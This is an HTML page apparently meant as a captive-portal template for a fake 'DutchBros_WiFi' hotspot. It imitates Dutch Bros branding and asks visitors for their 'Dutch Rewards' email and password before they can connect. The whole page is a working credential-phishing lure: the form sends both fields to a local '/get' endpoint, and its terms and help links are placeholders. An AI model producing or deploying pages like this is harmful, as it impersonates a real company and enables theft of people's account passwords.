<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Dutch Bros WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#003DA5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 16px 50px rgba(0,0,0,0.25)}
.top{background:#003DA5;padding:26px 24px 18px;text-align:center}
.windmill{font-size:36px;margin-bottom:8px}
.brand{font-size:24px;font-weight:900;color:#fff;letter-spacing:1px;text-transform:uppercase}
.tagline{font-size:10px;color:rgba(255,255,255,0.7);letter-spacing:2px;text-transform:uppercase;margin-top:4px}
.mid{background:#0033A0;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:7px;height:7px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.25)}
.mid span{font-size:11px;color:rgba(255,255,255,0.85)}
.mid strong{color:#fff}
.body{padding:24px}
h2{font-size:18px;font-weight:800;color:#003DA5;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#888;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #dde8ff;border-radius:10px;font-size:14.5px;background:#f5f8ff;color:#1a1a1a;font-family:inherit}
input:focus{outline:none;border-color:#003DA5;box-shadow:0 0 0 3px rgba(0,61,165,0.08)}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:50px;background:#003DA5;color:#fff;font-size:13px;font-weight:800;letter-spacing:1px;text-transform:uppercase;cursor:pointer;font-family:inherit}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:12px;line-height:1.6}
.terms a{color:#003DA5}
.foot{background:#f5f8ff;border-top:1px solid #dde8ff;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none}
.foot a{color:#003DA5}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="windmill">☕</div>
    <div class="brand">Dutch Bros</div>
    <div class="tagline">Speed. Quality. Service.</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>DutchBros_WiFi</strong></span></div>
  <div class="body">
    <h2>Hey There! 👋</h2>
    <p class="sub">Sign in with your Dutch Rewards account to get connected.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Dutch Bros Coffee</span><a href="#">Help</a></div>
</div>
</body>
</html>
